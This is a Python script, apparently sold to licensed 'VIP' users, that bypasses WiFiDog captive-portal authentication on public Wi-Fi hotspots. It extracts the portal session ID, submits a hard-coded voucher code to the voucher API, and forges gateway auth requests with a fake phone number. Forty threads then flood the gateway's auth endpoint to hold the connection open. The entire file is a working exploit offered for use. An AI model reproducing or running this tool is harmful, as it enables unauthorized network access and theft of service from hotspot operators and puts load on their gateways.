import requests, re, urllib3, time, threading, os, random, subprocess
from urllib.parse import urlparse, parse_qs, urljoin
from datetime import datetime

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- CONFIG ---
VIP_URL = "https://raw.githubusercontent.com/painglintun895-rgb/my-keys/refs/heads/main/vips.txt"
GAME_THREADS = 40 
USER_NAME, EXP_DATE, DAYS_LEFT = "MASTER-USER", "--", "?"

def get_uid():
    try: return subprocess.check_output(['whoami']).decode('utf-8').strip()
    except: return "u0_a232"

def update_status():
    global USER_NAME, EXP_DATE, DAYS_LEFT
    uid = get_uid()
    try:
        res = requests.get(f"{VIP_URL}?cb={random.random()}", timeout=10)
        if res.status_code == 200:
            for line in res.text.splitlines():
                if uid in line:
                    parts = line.split('|')
                    USER_NAME, EXP_DATE = parts[1].strip(), parts[2].strip()
                    try:
                        t_res = requests.get("http://worldtimeapi.org/api/timezone/Asia/Yangon", timeout=5)
                        now = datetime.strptime(t_res.json()['datetime'][:10], '%Y-%m-%d')
                    except: now = datetime.now()
                    DAYS_LEFT = (datetime.strptime(EXP_DATE, '%Y-%m-%d') - now).days
    except: pass

def banner():
    os.system('clear')
    uid = get_uid()
    print("\033[93m" + " ="*38)
    print("\033[96m" + """
     ██╗  ██╗ ██████╗  ██████╗██╗      █████╗ ██╗   ██╗
     ██║ ██╔╝██╔═══██╗██╔════╝██║     ██╔══██╗╚██╗ ██╔╝
     █████╔╝ ██║   ██║██║     ██║     ███████║ ╚████╔╝ 
     ██╔═██╗ ██║   ██║██║     ██║     ██╔══██║  ╚██╔╝  
     ██║  ██╗╚██████╔╝╚██████╗███████╗██║  ██║   ██║   
     ╚═╝  ╚═╝ ╚═════╝  ╚═════╝╚══════╝╚═╝  ╚═╝   ╚═╝   """)
    print(f"\033[95m 👑 USER: {USER_NAME} | \033[92m📅 EXP: {EXP_DATE} ({DAYS_LEFT} Days) | \033[94m🆔: {uid}")
    print("\033[93m ="*38 + "\033[0m")

def turbo_pulse(link):
    headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"}
    while True:
        try:
            start = time.time()
            requests.get(link, timeout=5, verify=False, headers=headers)
            ms = int((time.time() - start) * 1000)
            print(f"\033[92m[✓] 👑 KoＣＬＡＹ 👑 | Turbo >>> [{ms}ms]\033[0m")
            time.sleep(0.05) 
        except:
            time.sleep(1)
            break

def launch():
    banner()
    threading.Thread(target=update_status, daemon=True).start()
    session = requests.Session()
    
    while True:
        try:
            # Step 1: Force Bypass - ဆရာကြီး အလိုရှိတဲ့ Logic အတိုင်းပါ
            print("\033[94m[*] Initializing Master Tunnel...\033[0m")
            r = requests.get("http://connectivitycheck.gstatic.com/generate_204", allow_redirects=True, timeout=5)
            p_url = r.url
            
            # Step 2: Extract SID & Gateway
            r1 = session.get(p_url, verify=False, timeout=5)
            m = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
            n_url = urljoin(p_url, m.group(1)) if m else p_url
            r2 = session.get(n_url, verify=False, timeout=5)
            sid = parse_qs(urlparse(r2.url).query).get('sessionId', [None])[0]
            
            if sid:
                p_host = f"{urlparse(p_url).scheme}://{urlparse(p_url).netloc}"
                # Voucher ဝင်တာကို အတင်းလုပ်မယ်
                session.post(f"{p_host}/api/auth/voucher/", json={'accessCode': '123456', 'sessionId': sid, 'apiVersion': 1}, timeout=5)
                
                gw = parse_qs(urlparse(p_url).query).get('gw_address', ['192.168.60.1'])[0]
                port = parse_qs(urlparse(p_url).query).get('gw_port', ['2060'])[0]
                auth_link = f"http://{gw}:{port}/wifidog/auth?token={sid}&phonenumber=12345"
                
                banner()
                print(f"\033[95m[*] ⚡ GAME TUNNEL SECURED. ENJOY PING! ⚡\033[0m")
                for _ in range(GAME_THREADS):
                    threading.Thread(target=turbo_pulse, args=(auth_link,), daemon=True).start()
                
                # လိုင်းငြိမ်နေအောင် ထိန်းထားမယ်
                while True:
                    time.sleep(10)
                    try:
                        if requests.get("http://www.google.com/generate_204", timeout=5).status_code != 204: break
                    except: break
            else:
                # SID ရှာမတွေ့ရင်တောင် Turbo Mode ကို တန်းသွားဖို့ ကြိုးစားမယ်
                print("\033[93m[*] Manual Login Detected. Activating Pulse...\033[0m")
                for _ in range(GAME_THREADS):
                    threading.Thread(target=turbo_pulse, args=("http://192.168.60.1:2060/wifidog/auth?token=12345",), daemon=True).start()
                while True: time.sleep(10)
        except:
            time.sleep(2)

if __name__ == "__main__":
    launch()
